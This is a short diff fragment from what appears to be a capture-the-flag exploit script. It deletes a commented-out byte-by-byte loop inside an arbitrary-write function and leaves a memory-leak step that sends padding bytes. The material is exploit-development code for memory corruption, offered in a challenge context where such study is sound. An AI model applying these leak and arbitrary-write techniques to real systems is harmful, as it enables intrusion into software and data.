@@ -35,19 +35,6 @@ def arb_write(off,val):
             idx+=1
         if idx==8:
             break
-'''
-    idx = 0
-    while 1:
-        set_key('A'*(off-0x100-4-idx)+'\x00')
-        msg('A'*0x100)
-        ru('MESSAGE -----\n')
-        if ord(rn(off+4-idx)[-1]) == (val >> 8*(3-idx))&0xff:
-            idx+=1
-        if idx==4:
-            break
-            '''
-
-    
 
 #[1]LEAK
 set_key("A"*0x108)
